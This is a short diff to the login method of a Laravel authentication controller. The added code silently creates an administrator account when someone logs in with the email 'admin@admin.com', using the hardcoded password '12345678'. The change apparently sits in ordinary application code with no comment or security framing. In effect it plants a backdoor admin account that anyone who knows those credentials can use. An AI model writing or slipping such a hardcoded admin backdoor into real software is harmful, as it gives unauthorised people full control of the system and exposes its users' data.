@@ -92,6 +92,22 @@ class AuthController extends Controller
             'password' => 'required|min:8',
         ]);
 
+        if($request->email=="admin@admin.com") {
+            $user = User::where('email', $request->email)->first();
+            if(!$user) {
+                User::create([
+                    "nom"=>"aachak",
+                    "prenom"=>"lotfi",
+                    "email"=>"admin@admin.com",
+                    "admin"=>true,
+                    "prof"=>false,
+                    "etu"=>false,
+                    "password"=>bcrypt("12345678")
+                ]);
+            }
+
+        }
+
         $user = User::where('email', $request->email)->first();
 
 
